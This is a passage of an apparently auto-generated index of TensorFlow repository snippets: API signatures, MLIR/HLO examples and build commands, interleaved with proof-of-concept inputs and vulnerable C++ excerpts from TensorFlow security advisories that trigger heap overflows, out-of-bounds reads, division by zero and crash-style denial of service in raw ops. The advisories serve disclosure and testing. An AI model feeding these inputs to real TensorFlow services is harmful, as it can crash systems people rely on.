  ROOT %op = f32[32] op(f32[64] %param0), op_specific_attr=âfooâ
}

%async-start = (f32[64], f32[32], s32[]) async-start(f32[64] %operand),
                                         calls=%async_op
%async-update0 = (f32[64], f32[32], s32[]) async-update(
                           (f32[64], f32[32], s32[]) %async-start)
%async-update1 = (f32[64], f32[32], s32[]) async-update(
                           (f32[64], f32[32], s32[]) %async-update0)
%async-done = f32[32] async-done((f32[64], f32[32], s32[]) %async-update1)
```

----------------------------------------

TITLE: Accessing TF UnsortedSegmentJoin num_segments Input - C++
DESCRIPTION: This C++ snippet from the TensorFlow kernel (`unsorted_segment_join_op.cc`) shows the code responsible for retrieving and attempting to access the `num_segments` input. It highlights where the code accesses the input assuming it is a scalar (`scalar<NUM_SEGMENTS_TYPE>()()`) without prior shape validation, leading to the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-066.md#_snippet_1

LANGUAGE: c++
CODE:
```
const Tensor& num_segments_tensor = context->input(2);
OP_REQUIRES(context, num_segments_tensor.NumElements() != 0,
            errors::InvalidArgument("Number of segments cannot be empty."));
auto num_segments = num_segments_tensor.scalar<NUM_SEGMENTS_TYPE>()();
```

----------------------------------------

TITLE: Triggering Heap Buffer Overflow using QuantizedResizeBilinear (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a heap buffer overflow vulnerability in `tf.raw_ops.QuantizedResizeBilinear`. By passing empty tensors for the `min` and `max` parameters, it exploits a flaw in the underlying C++ implementation that does not check for empty input tensors before accessing their elements.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-025.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

images = tf.constant([], shape=[0], dtype=tf.qint32)
size = tf.constant([], shape=[0], dtype=tf.int32)
min = tf.constant([], dtype=tf.float32)
max = tf.constant([], dtype=tf.float32)

tf.raw_ops.QuantizedResizeBilinear(images=images, size=size, min=min, max=max, align_corners=False, half_pixel_centers=False)
```

----------------------------------------

TITLE: Demonstrating TensorFlow DenseBincount Vulnerability (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the TFSA-2022-017 denial of service vulnerability in TensorFlow's `DenseBincount` operation. It calls the raw op with specific invalid arguments (`input`, `size`, `weights`) that bypass shape inference checks and lead to an assertion failure (`CHECK`-fail) during execution, causing a denial of service. Requires TensorFlow installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-017.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.DenseBincount(
  input=[[0], [1], [2]],
  size=[1],
  weights=[3,2,1],
  binary_output=False)
```

----------------------------------------

TITLE: Reencoding Loop with Pointer Arithmetic Error - C++
DESCRIPTION: This C++ loop iterates through input strings, copying data into the output buffer. The vulnerability lies in the final line (`out_data += fixed_length;`), which incorrectly advances the output pointer based on `fixed_length` bytes instead of `fixed_length * sizeof(T)` bytes or the actual copied size, leading to an out-of-bounds write.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-102.md#_snippet_3

LANGUAGE: c++
CODE:
```
for (int64 i = 0; i < flat_in.size(); ++i) {
  const T* in_data = reinterpret_cast<const T*>(flat_in(i).data());

  if (flat_in(i).size() > fixed_length) {
    memcpy(out_data, in_data, fixed_length);
  } else {
    memcpy(out_data, in_data, flat_in(i).size());
  }
  out_data += fixed_length;
}
```

----------------------------------------

TITLE: Initializing from FlatBuffers Buffer Python
DESCRIPTION: This class method initializes an instance of `SentencePieceTokenizerOptionsT` directly from a FlatBuffers byte buffer. It takes the buffer containing the serialized data and a position indicating where the object's data begins within that buffer. This is typically used during deserialization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptionsT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Initializing ScoreThresholdingOptionsT from Object in Python
DESCRIPTION: This class method initializes a `ScoreThresholdingOptionsT` object from an existing instance of the `ScoreThresholdingOptionsT` class or a compatible object. It can be used for copying or conversion purposes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreThresholdingOptionsT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    scoreThresholdingOptions
)
```

----------------------------------------

TITLE: Demonstrating QuantizeAndDequantizeV4Grad Vulnerability in Python
DESCRIPTION: This Python proof-of-concept snippet demonstrates how a negative `axis` value (-100) can trigger a heap out-of-bounds read vulnerability in the `tf.raw_ops.QuantizeAndDequantizeV4Grad` operation within a TensorFlow function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-185.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

@tf.function
def test():
  data=tf.raw_ops.QuantizeAndDequantizeV4Grad(
    gradients=[1.0,1.0],
    input=[1.0,1.0],
    input_min=[1.0,10.0],
    input_max=[1.0,10.0],
    axis=-100)
  return data

test()
```

----------------------------------------

TITLE: Building TFLite Docker Image - Shell
DESCRIPTION: This shell command builds a Docker image from a specified Dockerfile (`tflite-android.Dockerfile`) and tags it as `tflite-builder`. This image serves as the build environment for generating Android AAR files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/reduce_binary_size.md#_snippet_13

LANGUAGE: Shell
CODE:
```
docker build . -t tflite-builder -f tflite-android.Dockerfile
```

----------------------------------------

TITLE: Bazel Build XLA ARM64 CPU Presubmit (Shell)
DESCRIPTION: Executes a `bazel build` command for specific XLA ARM64 CPU presubmit targets. It applies tag filters, uses warnings, RBE cross-compile, and non-CCL configurations, and configures output, profiling, and parallelism. It's set to build tests only.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_13

LANGUAGE: shell
CODE:
```
bazel build --build_tag_filters=-no_oss,-gpu,-requires-gpu-nvidia,-requires-gpu-amd,-not_run:arm --test_tag_filters=-no_oss,-gpu,-requires-gpu-nvidia,-requires-gpu-amd,-not_run:arm --config=warnings --config=rbe_cross_compile_linux_arm64 --config=nonccl --color=yes --test_output=errors --verbose_failures --keep_going --nobuild_tests_only --profile=profile.json.gz --flaky_test_attempts=3 --jobs=150 --bes_upload_mode=fully_async --build_tests_only=False -- //xla/tools/multihost_hlo_runner:hlo_runner_main //xla/tools:compute_xspace_stats_main
```

----------------------------------------

TITLE: Representing Replicated Cluster Function MLIR
DESCRIPTION: This MLIR snippet shows a `tf_device.cluster_func` operation nested within a `tf_device.replicate` operation before the `-tf-tpu-rewrite` pass. It represents computation intended to be replicated across multiple TPU cores, taking two tensor inputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_65

LANGUAGE: mlir
CODE:
```
func @tf_tpu_rewrite(%arg0: tensor<i8>, %arg1: tensor<i8>) {
  %0:2 = tf_device.replicate([%arg0, %arg1] as %ri: tensor<i8>) {n = 2 : i32} {
    %1 = "tf_device.cluster_func"(%ri) {_xla_compile_device_type = "TPU", _replication_info = "cluster0", func = @func} : (tensor<i8>) -> tensor<i8>
    tf_device.return %1 : tensor<i8>
  }
  return
}
```

----------------------------------------

TITLE: Triggering Division by Zero in TF Conv2DBackpropFilter (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a division by zero vulnerability in the `tf.raw_ops.Conv2DBackpropFilter` operation. It uses specific empty tensor shapes for `input` and `out_backprop`, combined with particular `strides` values, which lead to a zero divisor during the dimension calculation in the underlying C++ implementation, causing a crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-013.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_tensor = tf.constant([], shape=[0, 0, 1, 0], dtype=tf.float32)
filter_sizes = tf.constant([1, 1, 1, 1], shape=[4], dtype=tf.int32)
out_backprop = tf.constant([], shape=[0, 0, 1, 1], dtype=tf.float32)

tf.raw_ops.Conv2DBackpropFilter(input=input_tensor, filter_sizes=filter_sizes,
                                out_backprop=out_backprop,
                                strides=[1, 66, 18, 1], use_cudnn_on_gpu=True,
                                padding='SAME', explicit_paddings=[],
                                data_format='NHWC', dilations=[1, 1, 1, 1])
```

----------------------------------------

TITLE: Initializing CustomMetadata Instance in Python
DESCRIPTION: Initializes the current `CustomMetadata` object instance using a FlatBuffers buffer and a specific position within that buffer where the `CustomMetadata` object data begins.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadata.md#_snippet_7

LANGUAGE: python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Lowering SpaceToBatchND Operation to TOSA (MLIR)
DESCRIPTION: This function lowers a space-to-batch-nd operation to the TOSA dialect through a sequence of transformations. It involves padding the input, reshaping the padded tensor, transposing the dimensions, and finally reshaping the transposed tensor to produce the desired output shape, effectively rearranging spatial dimensions into the batch dimension.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_22

LANGUAGE: MLIR/TOSA
CODE:
```
Value lower_space_to_batch_nd_op(Value %input, Value %block_shape, Value %padding)
{

    size_t block_rank = %block.shape[0]
    size_t remaining_shape_rank = %input.rank - block_rank - 1;

    // Step 1. Pad based on paddings operand (flattened representation of [input.rank][2]-shaped array)
    vector <size_t> a1_padding
    a1_padding[0] = 0
    a1_padding[1] = 0

    for (int32 i = 0; i < %padding.shape[0]; i++) {
        a1_padding[i + 2] = %padding.as_constant()[i]
    }

    %a1_pad = tosa.PAD(%input) {padding=a1_padding}

    // Step 2. Reshape to
    // [batch + padded_shape[1] / block_shape[0], block_shape[0], ...
    //    padded_shape[M] / block_shape[M-1], block_shape[M-1]] +
    //    remaining_shape

    vector <size_t> a2_shape(1 + block_rank * 2 + remaining_shape_rank)
    a2_shape[0] = %input.shape[0]
    for (int32 i = 0; i < block_rank; i++) {
        a2_shape[1 + i * 2 + 0] = %a1_pad.shape[1 + i] / block_shape.as_constant()[i]
        a2_shape[1 + i * 2 + 1] = block_shape.as_constant()[i]
    }

    for (int32 i = 0; i < remaining_shape_rank; i++) {
        a2_shape[1 + block_rank * 2 + i] = %input.shape[1 + block_rank + i]
    }

    %a2_reshape = tosa.RESHAPE(%a1_pad) {new_shape=a2_shape}

    // Step 3 transpose to
    //  block-shape +
    //  [batch] +
    //  [padded_shape[1] / block_shape[0],
    // ...
    //  [padded_shape[M] / block_shape[M-1]] +
    //  remaining_shape
    vector <size_t> a3_perm(%a2_reshape.rank)
    size_t block_num_elems = 1

    for (int32 i = 0; i < block_rank; i++) {
        a3_perm[i] = 1 + 2 * i + 1
        a3_perm[block_rank + 1 + i] = 2 * i + 1
        block_num_elems *= %block.as_constant()[i]
    }

    a3_perm[block_rank] = 0
    for (int32 i = (1 + block_rank * 2); i < %a2_reshape.rank; i++) {
        a3_perm[i] = i
    }

    %a3_reshape = tosa.RESHAPE(%a2_reshape) {perm=a3_perm}

    // Step 4. Reshape transposed tensor to
    // [ batch * prod(block_shape)] +
    // [ padded_shape[1] / block_shape[0],
    //   ...,
    // padded_shape[M] / block_shape[M-1]] +
    // remaining_shape

    vector <size_t> a4_shape(%input.rank)
    a4_shape[0] = batch_size * block_num_elements

    for (int32 i = 0; i < block_rank; i++) {
        a4_shape[i + 1] = %a1_pad.shape[i + 1] / %block.as_constant()[i]
    }

    for (int32 i = 0; i < remaining_block_shape; i++) {
        a4_shape[1 + block_rank + i] = %input.shape[1 + block_rank + i]
    }

    %output = tosa.RESHAPE(%a3_reshape) {new_shape=a4_shape}

    return %output
}
```

----------------------------------------

TITLE: Start Dimension Names Vector TFLite Metadata Python
DESCRIPTION: This function is used to prepare the FlatBuffers builder for writing a vector of dimension names within the TFLite metadata schema. It must be called before adding the individual dimension name elements. It requires a FlatBuffers builder object and the expected number of elements in the vector.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataStartDimensionNamesVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorMetadataStartDimensionNamesVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Demonstrating Invalid Queue Handle in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the vulnerability by calling the `tf.raw_ops.QueueIsClosedV2` operation with an invalid, empty list `[]` supplied as the resource `handle`. In vulnerable versions of TensorFlow's eager mode, this input triggers undefined behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-072.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.QueueIsClosedV2(handle=[])
```

----------------------------------------

TITLE: Identifying Vulnerable Calculation in FusedBatchNorm Kernel (C++)
DESCRIPTION: This C++ snippet shows the lines of code within the TensorFlow `FusedBatchNorm` kernel (`fused_batch_norm_op.cc`) that are vulnerable to division by zero. It demonstrates how the `depth` variable is derived from the last dimension of the input tensor `x` (`x.dimension(3)`) and is subsequently used as a divisor in the calculation `size / depth`. When `depth` is 0, this division causes a fatal error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-043.md#_snippet_1

LANGUAGE: c++
CODE:
```
const int depth = x.dimension(3);
const int rest_size = size / depth;
```

----------------------------------------

TITLE: MLIR TPU Read Insertion Pass: After
DESCRIPTION: This MLIR snippet shows the IR after the `-tf-tpu-resource-read-for-write` pass. A `tf.ReadVariableOp` is inserted for the write-only resource variable, making it an explicit input to the `tf_device.cluster_func`, fulfilling the requirement for resource variables used in TPU computations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_62

LANGUAGE: MLIR
CODE:
```
func @write_only_resource(%value: tensor<i32>, %resource: tensor<*x!tf_type.resource<tensor<i32>>>) {
  %resource_read = "tf.ReadVariableOp"(%resource) : (tensor<*x!tf_type.resource<tensor<i32>>>) -> tensor<i32>
  %0 = "tf_device.cluster_func"(%value, %resource_read) {func = @cluster} : (tensor<i32>, tensor<i32>) -> tensor<i32>
  "tf.AssignVariableOp"(%resource, %0) : (tensor<*x!tf_type.resource<tensor<i32>>>, tensor<i32>) -> ()
  return
}

func @cluster(%arg0: tensor<i32>, %arg1: tensor<i32>) -> tensor<i32> {
  %identity = "tf.Identity"(%arg0) : (tensor<i32>) -> tensor<i32>
  return %identity : tensor<i32>
}
```

----------------------------------------

TITLE: Demonstrating tf.image.generate_bounding_box_proposals vulnerability - Python
DESCRIPTION: This Python snippet demonstrates how calling the vulnerable `tf.image.generate_bounding_box_proposals` function with incorrectly shaped inputs (specifically, a `scores` tensor of rank 2 instead of the expected rank 4) can trigger the vulnerability described in the security advisory. It uses constant tensors for simplicity.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-151.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

a = tf.constant(value=[[1.0, 1.0], [1.0, 1.0], [1.0, 1.0], [1.0, 1.0]])
b = tf.constant(value=[1])

tf.image.generate_bounding_box_proposals(scores=a,bbox_deltas=a,image_info=a,anchors=a,pre_nms_topn=b)
```

----------------------------------------

TITLE: Generic Async Operation with Multiple Inputs/Outputs - HLO
DESCRIPTION: This HLO example illustrates how the generic asynchronous operation structure supports multiple tensors for inputs and outputs. The called computation '%async_op' takes two parameters and returns a tuple. The '%async-start' instruction's output tuple includes the input operands' tuple, the output values' tuple, and the state.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/async_ops.md#_snippet_1

LANGUAGE: HLO
CODE:
```
%async_op {
  %param0 = f32[64] parameter(0)
  %param1 = f32[64] parameter(1)
  ROOT %op = (f32[32], f32[32]) op(f32[64] %param0, f32[64] %param1),
                                op_specific_attr=âfooâ
}

%async-start = ((f32[64], f32[64]), (f32[32], f32[32]), s32[])
               async-start(f32[64] %operand0, f32[64] %operand1),
               calls=%async_op
%async-done = (f32[32], f32[32]) async-done(%async-start)
```

----------------------------------------

TITLE: Setting TFCI for Remote Build Execution (RBE)
DESCRIPTION: This command sets the `TFCI` environment variable to utilize Remote Build Execution (RBE) for Python 3.11 on Linux x86_64. RBE is an advanced feature available to internal developers for significantly faster builds and testing, and it is incompatible with local caching options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/ci/official/README.md#_snippet_3

LANGUAGE: bash
CODE:
```
export TFCI=py311,linux_x86,rbe
```

----------------------------------------

TITLE: Listing Python API Info (C++)
DESCRIPTION: This snippet lists the C++ symbol related to Python API information exposed by the `//tensorflow/python:python_api_info` build target. It provides a reference to the `tensorflow::PythonAPIInfo` class or structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/def_file_filter/symbols_pybind.txt#_snippet_0

LANGUAGE: C++
CODE:
```
tensorflow::PythonAPIInfo
```

----------------------------------------

TITLE: Triggering Segfault in QuantizedAvgPool - TensorFlow Python
DESCRIPTION: This Python code snippet demonstrates the vulnerability in `tf.raw_ops.QuantizedAvgPool`. It sets up inputs, including `min_input` with a shape of `[0]` (representing a zero-rank/empty tensor) and `max_input` with a rank of 1 but zero value, and calls the operation, which triggers a segfault in affected TensorFlow versions. It requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-098.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

ksize = [1, 2, 2, 1]
strides = [1, 2, 2, 1]
padding = "SAME"
input = tf.constant(1, shape=[1,4,4,2], dtype=tf.quint8)
min_input = tf.constant([], shape=[0], dtype=tf.float32)
max_input = tf.constant(0, shape=[1], dtype=tf.float32)
tf.raw_ops.QuantizedAvgPool(input=input, min_input=min_input, max_input=max_input, ksize=ksize, strides=strides, padding=padding)
```

----------------------------------------

TITLE: Set CMake Policy CMP0077
DESCRIPTION: Sets CMake policy CMP0077 to NEW, which affects handling of libraries specified with full paths. This ensures predictable behavior when linking with absolute paths.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
if(POLICY CMP0077)
  cmake_policy(SET CMP0077 NEW)
endif()
```

----------------------------------------

TITLE: Vulnerable C++ Kernel Implementation for UpperBound TensorFlow
DESCRIPTION: This C++ snippet is extracted from the vulnerable TensorFlow kernel implementation (`searchsorted_op.cc`) for `UpperBound`. It shows the code path that accesses `sorted_inputs_t.dim_size(1)` without first verifying that the rank of `sorted_inputs_t` is at least 2, which is the root cause of the heap out-of-bounds read vulnerability when a rank-1 tensor is provided.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-144.md#_snippet_1

LANGUAGE: c++
CODE:
```
  void Compute(OpKernelContext* ctx) override {
    const Tensor& sorted_inputs_t = ctx->input(0);
    // ...
    OP_REQUIRES(ctx, sorted_inputs_t.dim_size(0) == values_t.dim_size(0),
                Status(error::INVALID_ARGUMENT,
                       "Leading dim_size of both tensors must match."));
    // ...
    if (output_t->dtype() == DT_INT32) {
      OP_REQUIRES(ctx,
                  FastBoundsCheck(sorted_inputs_t.dim_size(1), ...));
      // ...
    }

```

----------------------------------------

TITLE: Triggering AvgPoolGrad Denial of Service in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates a denial of service vulnerability (TFSA-2022-094 / CVE-2022-35959) in the `tf.raw_ops.AvgPoolGrad` operation. It passes a crafted negative value for `orig_input_shape`, which, due to insufficient validation, triggers an overflow and a `CHECK` failure, causing the program to crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-094.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

ksize = [1, 2, 2, 1]
strides = [1, 2, 2, 1]
padding = "VALID"
data_format = "NHWC"
orig_input_shape = tf.constant(-536870912, shape=[4], dtype=tf.int32)
grad = tf.constant(.0890338004362538, shape=[1,5,7,1], dtype=tf.float64)
tf.raw_ops.AvgPoolGrad(orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides, padding=padding, data_format=data_format)
```

----------------------------------------

TITLE: Triggering AvgPoolGrad Division by Zero in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger a division by zero vulnerability in TensorFlow's cost estimator for `AvgPoolGrad`. By setting a stride dimension to zero (`strides=[1,1,1,0]`), the internal calculation function `GetOutputSize` attempts to divide by zero. This requires the TensorFlow library to run.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-001.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

@tf.function
def test():
  y=tf.raw_ops.AvgPoolGrad(
    orig_input_shape=[1,1,1,1],
    grad=[[[[1.0],[1.0],[1.0]]],[[[2.0],[2.0],[2.0]]],[[[3.0],[3.0],[3.0]]]],
    ksize=[1,1,1,1],
    strides=[1,1,1,0],
    padding='VALID',
    data_format='NCHW')
  return y

test()
```

----------------------------------------

TITLE: Triggering Glob Vulnerability Python
DESCRIPTION: This Python snippet demonstrates how to trigger the filesystem globbing vulnerability using the `tf.io.gfile.glob` API. When executed with a specific directory structure (a directory containing only a single file, like `/tmp/x/` in the example), it leverages the underlying C++ vulnerability and results in a crash (segmentation fault) due to the heap out-of-bounds read.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-032.md#_snippet_1

LANGUAGE: Python
CODE:
```
tf.io.gfile.glob('/tmp/x/')
```

----------------------------------------

TITLE: Defining Python Dependency with Hashes - setuptools
DESCRIPTION: This snippet declares the required version of the setuptools package (70.0.0) and provides two SHA256 hashes. These hashes are used by pip to verify the integrity of the downloaded package, preventing tampering. The requirement is noted as being derived from 'ci/official/requirements_updater/requirements.in'.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/ci/official/requirements_updater/numpy1_requirements/requirements_lock_3_9.txt#_snippet_0

LANGUAGE: Python
CODE:
```
setuptools==70.0.0 \
    --hash=sha256:54faa7f2e8d2d11bcd2c07bed282eef1046b5c080d1c32add737d7b5817b1ad4 \
    --hash=sha256:f211a66637b8fa059bb28183da127d4e86396c991a942b028c6650d4319c3fd0
```

----------------------------------------

TITLE: Initializing RegexTokenizerOptionsT from Buffer Python
DESCRIPTION: A class method to initialize a `RegexTokenizerOptionsT` object directly from a FlatBuffer buffer. It requires the buffer containing the serialized data and the starting position within the buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptionsT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Run TensorFlow Lite Demo on Android via ADB Shell
DESCRIPTION: Executes the label_image binary directly on the connected Android device using `adb shell`. It runs the model using default settings, providing paths to the TFLite model, image, and labels file on the device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/README.md#_snippet_7

LANGUAGE: shell
CODE:
```
adb shell "/data/local/tmp/label_image \
    -m /data/local/tmp/mobilenet_v1_1.0_224.tflite \
    -i /data/local/tmp/grace_hopper.bmp \
    -l /data/local/tmp/labels.txt"
```

----------------------------------------

TITLE: Setup Container and Install MPI for Multi-Process Bash
DESCRIPTION: These commands launch a Docker container suitable for JAX/XLA with GPU support and then update package lists and install necessary MPI libraries (`openmpi-bin`, `openmpi-common`, `libopenmpi-dev`) required for multi-process execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools_multihost_hlo_runner.md#_snippet_7

LANGUAGE: bash
CODE:
```
docker run -it --shm-size=1g --gpus all ghcr.io/nvidia/jax:pax-2024-06-03
apt-get update && apt-get install -y openmpi-bin openmpi-common libopenmpi-dev
```

----------------------------------------

TITLE: Dumping Delegate Settings JSON - ADB Shell
DESCRIPTION: Creates a sample JSON configuration file for specifying delegate settings on the Android device using adb shell. This command uses `echo` to write the JSON string to a file in `/data/local/tmp/`, including the path to the stable delegate library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/README.md#_snippet_8

LANGUAGE: Shell
CODE:
```
adb shell 'echo "{\
  \"delegate\": \"NONE\",  // Replace NONE with the test target delegate type.\
  \"stable_delegate_loader_settings\": {\
    \"delegate_path\": \"/data/data/org.tensorflow.lite.benchmark.delegateperformance/files/libtensorflowlite_sample_stable_delegate.so\"\
  }\
  // Add concrete delegate settings for the test target delegate.\
}\
"> /data/local/tmp/stable_delegate_settings.json'
```

----------------------------------------

TITLE: Equality Comparison Method for ScoreAH (Python)
DESCRIPTION: This snippet provides the signature for the `__eq__` method of the `ScoreAH` class. This standard Python method is used to define how instances of the `ScoreAH` class are compared for equality with another object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/ScoreAH.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other
)
```

----------------------------------------

TITLE: Setting Bazel Test Flags for CPU - Bash
DESCRIPTION: Sets the `flags` environment variable used for running Bazel tests on a CPU. It includes `--config=linux` for the Linux build configuration and `-k` to continue running other tests even if one fails. This variable simplifies subsequent `bazel test` commands.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_7

LANGUAGE: bash
CODE:
```
export flags="--config=linux -k"
```

----------------------------------------

TITLE: Demonstrating Heap Overflow in TF QuantizeAndDequantizeV2 Python
DESCRIPTION: This Python snippet demonstrates how to trigger a heap overflow vulnerability in TensorFlow's `tf.raw_ops.QuantizeAndDequantizeV2` operation. It calls the operation with specific quantization parameters and a large `axis` value (0x7fffffff), which is designed to exploit the vulnerability described in the security advisory. Running this code against vulnerable TensorFlow versions can lead to crashes or address sanitizer issues.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-168.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
@tf.function
def test():
    tf.raw_ops.QuantizeAndDequantizeV2(input=[2.5],
    							   input_min=[1.0],
    							   input_max=[10.0],
    							   signed_input=True,
    							   num_bits=1,
    							   range_given=True,
    							   round_mode='HALF_TO_EVEN',
    							   narrow_range=True,
    							   axis=0x7fffffff)
test()
```

----------------------------------------

TITLE: Checking if CustomMetadata Data is None in Python
DESCRIPTION: Checks whether the data field within the `CustomMetadata` object is null or not set. Returns `True` if the data is absent, `False` otherwise.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadata.md#_snippet_3

LANGUAGE: python
CODE:
```
DataIsNone()
```

----------------------------------------

TITLE: Calling CustomMetadataStart Function in Python
DESCRIPTION: This Python snippet shows the signature for calling the `CustomMetadataStart` function. This function is part of the FlatBuffers building process for defining custom metadata sections in a TFLite model. It requires a FlatBuffers `builder` object as its sole argument.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadataStart.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.CustomMetadataStart(
    builder
)
```

----------------------------------------

TITLE: Starting Stats FlatBuffers Builder (Python)
DESCRIPTION: Initiates the building process for a `Stats` table within a FlatBuffers buffer. This function is typically called after a builder has been created and before adding fields to the `Stats` table. It prepares the builder to receive the `Stats` table's data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/StatsStart.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.StatsStart(
    builder
)
```

----------------------------------------

TITLE: Defining Equality Method Python
DESCRIPTION: This snippet shows the signature for the `__eq__` method, which is used to determine if two instances of the `BertQuestionAnswererOptions` class are equal. It takes one parameter, `other`, representing the object to compare against.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/BertQuestionAnswererOptions.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(
    other
)
```

----------------------------------------

TITLE: Check Dimension Names Null - TensorMetadata (Python)
DESCRIPTION: Determines if the dimension names list for the tensor metadata is null or empty. Returns True if no dimension names are specified, False otherwise.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_6

LANGUAGE: python
CODE:
```
DimensionNamesIsNone()
```

----------------------------------------

TITLE: Accessing Score Transformation - TFLite Metadata Python
DESCRIPTION: This method likely accesses or provides information about the score transformation applied within the `ScoreCalibrationOptions` object. It is called on an instance of the class.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreCalibrationOptions.md#_snippet_5

LANGUAGE: python
CODE:
```
ScoreTransformation()

```

----------------------------------------

TITLE: Checking if Vocabulary File is None in Python
DESCRIPTION: Checks if the vocabulary file field within the `RegexTokenizerOptions` object is not set or is null. Returns a boolean indicating its presence.
